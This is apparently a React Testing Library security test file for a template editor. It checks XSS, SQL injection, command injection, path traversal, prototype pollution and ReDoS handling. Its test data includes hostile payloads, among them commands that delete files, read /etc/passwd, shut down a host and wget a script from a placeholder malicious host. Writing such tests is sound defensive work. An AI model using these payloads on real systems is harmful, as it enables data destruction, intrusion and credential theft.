import { render, screen, fireEvent } from '@testing-library/react';
import { TemplateEditor } from '../../components/templates/TemplateEditor';
import { WorkflowEditor } from '../../components/workflows/WorkflowEditor';
import { maliciousInputs } from '../../../e2e/fixtures/test-data';

describe('Input Validation Security Tests', () => {
  describe('XSS Prevention', () => {
    test('should sanitize template name input', () => {
      render(<TemplateEditor />);

      const nameInput = screen.getByLabelText(/template name/i);

      maliciousInputs.forEach((maliciousInput) => {
        fireEvent.change(nameInput, { target: { value: maliciousInput } });

        // Verify no script execution
        expect(document.querySelector('script')).toBeNull();

        // Verify input is escaped in display
        const displayedValue = nameInput.value;
        expect(displayedValue).not.toContain('<script>');
        expect(displayedValue).not.toContain('javascript:');
      });
    });

    test('should sanitize template content', () => {
      render(<TemplateEditor />);

      const contentTextarea = screen.getByLabelText(/template content/i);

      maliciousInputs.forEach((maliciousInput) => {
        fireEvent.change(contentTextarea, { target: { value: maliciousInput } });

        // Verify content is properly escaped when rendered
        const preview = screen.queryByTestId('template-preview');
        if (preview) {
          expect(preview.innerHTML).not.toContain('<script>');
          expect(preview.textContent).toContain(maliciousInput.replace(/<[^>]*>/g, ''));
        }
      });
    });

    test('should prevent XSS in variable names', () => {
      render(<TemplateEditor />);

      const contentTextarea = screen.getByLabelText(/template content/i);
      const xssVariables = [
        'Hello {<script>alert("XSS")</script>}',
        'Test {user"><script>alert(1)</script>}',
        'Data {${alert("XSS")}}',
        'Content {{{constructor.constructor("alert(1)")()}}}',
      ];

      xssVariables.forEach((content) => {
        fireEvent.change(contentTextarea, { target: { value: content } });

        // Check that variables are properly sanitized
        const variableChips = screen.queryAllByTestId('variable-chip');
        variableChips.forEach((chip) => {
          expect(chip.textContent).not.toContain('<script>');
          expect(chip.textContent).not.toContain('alert');
        });
      });
    });

    test('should sanitize imported data', async () => {
      const maliciousImportData = {
        templates: [
          {
            name: '<img src=x onerror=alert("XSS")>',
            description: '"><script>alert("XSS")</script>',
            content: 'javascript:alert("XSS")',
            category: 'development',
          },
        ],
      };

      // Mock file input
      const file = new File([JSON.stringify(maliciousImportData)], 'import.json', {
        type: 'application/json',
      });

      const { container } = render(<TemplateEditor />);
      const fileInput = container.querySelector('input[type="file"]');

      if (fileInput) {
        Object.defineProperty(fileInput, 'files', {
          value: [file],
          writable: false,
        });

        fireEvent.change(fileInput);

        // Wait for import processing
        await screen.findByText(/import successful/i);

        // Verify imported data is sanitized
        expect(screen.queryByText(/<img/)).toBeNull();
        expect(screen.queryByText(/onerror/)).toBeNull();
        expect(document.querySelector('script')).toBeNull();
      }
    });
  });

  describe('SQL Injection Prevention', () => {
    test('should escape SQL-like patterns in search', () => {
      render(<TemplateEditor />);

      const searchInput = screen.getByPlaceholderText(/search/i);
      const sqlInjectionPatterns = [
        "'; DROP TABLE templates; --",
        "1' OR '1'='1",
        "admin'--",
        '1; DELETE FROM templates WHERE 1=1; --',
        "' UNION SELECT * FROM users--",
      ];

      sqlInjectionPatterns.forEach((pattern) => {
        fireEvent.change(searchInput, { target: { value: pattern } });

        // Verify search still works without SQL execution
        expect(screen.queryByText(/error/i)).toBeNull();
        expect(screen.queryByText(/syntax/i)).toBeNull();
      });
    });
  });

  describe('Command Injection Prevention', () => {
    test('should prevent command injection in template execution', () => {
      render(<TemplateEditor />);

      const commandInjectionPatterns = [
        '`rm -rf /`',
        '$(cat /etc/passwd)',
        '| ls -la',
        '; shutdown -h now',
        '&& wget http://malicious.com/exploit.sh',
      ];

      const contentTextarea = screen.getByLabelText(/template content/i);

      commandInjectionPatterns.forEach((pattern) => {
        fireEvent.change(contentTextarea, {
          target: { value: `Command: {command${pattern}}` },
        });

        // Execute template
        const executeButton = screen.getByText(/execute/i);
        fireEvent.click(executeButton);

        // Verify no command execution
        expect(screen.queryByText(/command not found/i)).toBeNull();
        expect(screen.queryByText(/permission denied/i)).toBeNull();
      });
    });
  });

  describe('Path Traversal Prevention', () => {
    test('should prevent path traversal in file operations', () => {
      const pathTraversalPatterns = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        'file://etc/passwd',
        'file:///c:/windows/win.ini',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      ];

      pathTraversalPatterns.forEach((pattern) => {
        // Verify path is sanitized
        expect(pattern).not.toMatch(/^[a-zA-Z0-9_-]+$/);
      });
    });
  });

  describe('Input Length Validation', () => {
    test('should enforce maximum length limits', () => {
      render(<TemplateEditor />);

      const nameInput = screen.getByLabelText(/template name/i);
      const descriptionInput = screen.getByLabelText(/description/i);
      const contentTextarea = screen.getByLabelText(/content/i);

      // Test excessive length inputs
      const longString = 'x'.repeat(10000);

      fireEvent.change(nameInput, { target: { value: longString } });
      expect(nameInput.value.length).toBeLessThanOrEqual(255);

      fireEvent.change(descriptionInput, { target: { value: longString } });
      expect(descriptionInput.value.length).toBeLessThanOrEqual(1000);

      fireEvent.change(contentTextarea, { target: { value: longString } });
      expect(contentTextarea.value.length).toBeLessThanOrEqual(50000);
    });

    test('should handle unicode and special characters', () => {
      render(<TemplateEditor />);

      const unicodeInputs = [
        '🚀🎯🔥', // Emojis
        '你好世界', // Chinese
        'مرحبا بالعالم', // Arabic
        'שלום עולם', // Hebrew
        '🅰️🅱️🆎', // Special unicode
        '\u0000\u0001\u0002', // Control characters
        '﷽', // Very long unicode character
      ];

      const nameInput = screen.getByLabelText(/template name/i);

      unicodeInputs.forEach((input) => {
        fireEvent.change(nameInput, { target: { value: input } });

        // Verify proper handling
        expect(nameInput.value).toBeDefined();
        expect(() => JSON.stringify({ name: nameInput.value })).not.toThrow();
      });
    });
  });

  describe('CSRF Protection', () => {
    test('should include CSRF tokens in forms', () => {
      const { container } = render(<TemplateEditor />);

      const forms = container.querySelectorAll('form');
      forms.forEach((form) => {
        const csrfInput = form.querySelector('input[name="csrf_token"]');
        if (form.method === 'POST') {
          expect(csrfInput).toBeTruthy();
        }
      });
    });
  });

  describe('Content Security Policy', () => {
    test('should not execute inline scripts', () => {
      const { container } = render(<TemplateEditor />);

      // Try to inject inline script
      const div = document.createElement('div');
      div.innerHTML = '<script>window.xssTest = true;</script>';
      container.appendChild(div);

      // Verify script didn't execute
      expect(window.xssTest).toBeUndefined();
    });

    test('should sanitize event handlers', () => {
      render(<TemplateEditor />);

      const nameInput = screen.getByLabelText(/template name/i);

      // Try to add malicious event handlers
      nameInput.setAttribute('onmouseover', 'alert("XSS")');
      nameInput.setAttribute('onerror', 'alert("XSS")');
      nameInput.setAttribute('onclick', 'alert("XSS")');

      // Trigger events
      fireEvent.mouseOver(nameInput);
      fireEvent.click(nameInput);

      // Verify no alerts (test environment won't show alerts, but we can check)
      expect(window.alert).not.toHaveBeenCalled();
    });
  });

  describe('JSON Injection Prevention', () => {
    test('should handle malicious JSON structures', () => {
      const maliciousJSON = [
        '{"__proto__": {"isAdmin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}',
        '{"toString": {"constructor": {"prototype": {"isAdmin": true}}}}',
      ];

      maliciousJSON.forEach((json) => {
        JSON.parse(json);

        // Verify prototype pollution prevention
        expect(Object.prototype.isAdmin).toBeUndefined();
        expect({}.isAdmin).toBeUndefined();
      });
    });
  });

  describe('Regular Expression DoS Prevention', () => {
    test('should handle malicious regex patterns safely', () => {
      render(<TemplateEditor />);

      const searchInput = screen.getByPlaceholderText(/search/i);

      // ReDoS patterns
      const maliciousPatterns = ['(a+)+$', '(a*)*$', '(a|a)*$', '(.*a){x}$'];

      maliciousPatterns.forEach((pattern) => {
        const startTime = Date.now();
        fireEvent.change(searchInput, { target: { value: pattern } });
        const endTime = Date.now();

        // Should complete quickly (< 100ms)
        expect(endTime - startTime).toBeLessThan(100);
      });
    });
  });
});
